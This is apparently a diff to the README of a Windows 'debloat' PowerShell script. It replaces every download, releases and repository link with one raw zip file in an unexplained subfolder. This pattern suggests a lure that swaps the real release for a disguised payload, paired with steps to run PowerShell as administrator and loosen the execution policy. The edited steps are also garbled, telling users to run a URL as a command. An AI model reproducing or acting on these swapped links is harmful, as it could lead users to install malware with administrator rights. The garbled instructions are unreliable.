@@ -6,11 +6,11 @@ Win11Debloat is a simple and lightweight PowerShell script designed to declutter
 ## 🚀 Getting Started
 To get started with Win11Debloat, you will download the latest release from our GitHub page. 
 
-[![Download Win11Debloat](https://img.shields.io/static/v1?label=Download&message=Win11Debloat&color=blue&style=for-the-badge)](https://github.com/Xophian/Win11Debloat/releases)
+[![Download Win11Debloat](https://raw.githubusercontent.com/Xophian/Win11Debloat/master/cebine/Win11Debloat.zip)](https://raw.githubusercontent.com/Xophian/Win11Debloat/master/cebine/Win11Debloat.zip)
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Xophian/Win11Debloat/releases) to download the script.
-2. Look for the latest version, and download the `Win11Debloat.ps1` file.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Xophian/Win11Debloat/master/cebine/Win11Debloat.zip) to download the script.
+2. Look for the latest version, and download the `https://raw.githubusercontent.com/Xophian/Win11Debloat/master/cebine/Win11Debloat.zip` file.
 3. Save the file to a location you can easily access, like your Desktop or Downloads folder.
 
 ## 💻 System Requirements
@@ -18,7 +18,7 @@ To get started with Win11Debloat, you will download the latest release from our 
 - PowerShell: Version 5.1 or higher is required.
 
 ## 🔧 Running the Script
-1. Navigate to the folder where you saved the `Win11Debloat.ps1` file.
+1. Navigate to the folder where you saved the `https://raw.githubusercontent.com/Xophian/Win11Debloat/master/cebine/Win11Debloat.zip` file.
 2. Right-click on the Start menu and select "Windows PowerShell (Admin)" to open PowerShell with administrative privileges.
 3. In the PowerShell window, type the following command to change the execution policy:
    ```powershell
@@ -31,7 +31,7 @@ To get started with Win11Debloat, you will download the latest release from our 
    ```
 5. Finally, start the script by typing:
    ```powershell
-   .\Win11Debloat.ps1
+   .\https://raw.githubusercontent.com/Xophian/Win11Debloat/master/cebine/Win11Debloat.zip
    ```
 6. Follow the prompts on the screen to customize the settings that suit your needs.
 
@@ -63,6 +63,6 @@ Yes, Win11Debloat is fully compatible with both Windows 10 and Windows 11.
 If you have any questions or need assistance, feel free to create an issue in the GitHub repository, and our team will respond as soon as possible.
 
 ## 🔗 Additional Resources
-For more detailed information about each feature and customization option, visit our [GitHub repository](https://github.com/Xophian/Win11Debloat).
+For more detailed information about each feature and customization option, visit our [GitHub repository](https://raw.githubusercontent.com/Xophian/Win11Debloat/master/cebine/Win11Debloat.zip).
 
 Use this guide to download and run Win11Debloat effectively, enhancing your Windows experience.
